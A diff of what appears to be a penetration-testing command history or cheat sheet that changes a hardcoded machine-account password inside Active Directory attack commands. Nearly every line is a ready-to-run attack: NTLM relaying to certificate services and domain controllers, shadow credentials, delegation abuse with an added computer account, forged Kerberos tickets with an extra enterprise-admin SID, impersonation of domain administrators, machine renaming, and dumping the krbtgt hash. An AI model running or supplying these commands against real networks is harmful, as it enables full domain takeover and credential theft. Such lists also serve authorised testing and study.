@@ -2,8 +2,8 @@ ntlmrelayx -t "https://${ADCS_HOST:-pki.$DOMAIN}/certsrv/certfnsh.asp" -smb2supp
 ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
 ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
 ntlmrelayx -t "ldaps://$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --escalate-user 'NIHIL-01$'
-ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
-ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
+ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'NIHIL-01' 'fly2own@Pigeons'
+ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'NIHIL-01' 'fly2own@Pigeons'
 ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
 ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
 ntlmrelayx -smb2support -t smb://"$IP"
@@ -149,7 +149,7 @@ ticketer -nthash "$NT_HASH" -domain "$DOMAIN" -domain-sid "$DOMAIN_SID" -extra-s
 ticketer -nthash "$NT_HASH" -spn "$HOST"/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
 getST "$DOMAIN/$COMPUTER_NAME$" -spn "cifs/$TARGET" -impersonate "$ADMIN_USER" -dc-ip "$IP"
 renameMachine -current-name "$COMPUTER_NAME$" -new-name "$TARGET" -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
-getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'nihil4thewin'
+getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'fly2own@Pigeons'
 getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
 renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
@@ -164,7 +164,7 @@ getST.py "$DOMAIN/$USER" -impersonate "$TARGET_USER" -dc-ip "$IP" -spn "CIFS/DC"
 ticketer.py -nthash "$NT_HASH" -domain "$DOMAIN" -domain-sid "$DOMAIN_SID" -extra-sid "$PARENT_SID"-519 "$DUMMY_USER"
 ticketer.py -nthash "$NT_HASH" -spn "$HOST"/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
 getST.py "$DOMAIN/$COMPUTER_NAME$" -spn "cifs/$TARGET" -impersonate "$ADMIN_USER" -dc-ip "$IP"
-getST -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'nihil4thewin'
+getST -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'fly2own@Pigeons'
 getST -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 renameMachine.py -current-name "$COMPUTER_NAME$" -new-name "$TARGET" -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
 KRB5CCNAME="$CCACHE_PATH" secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
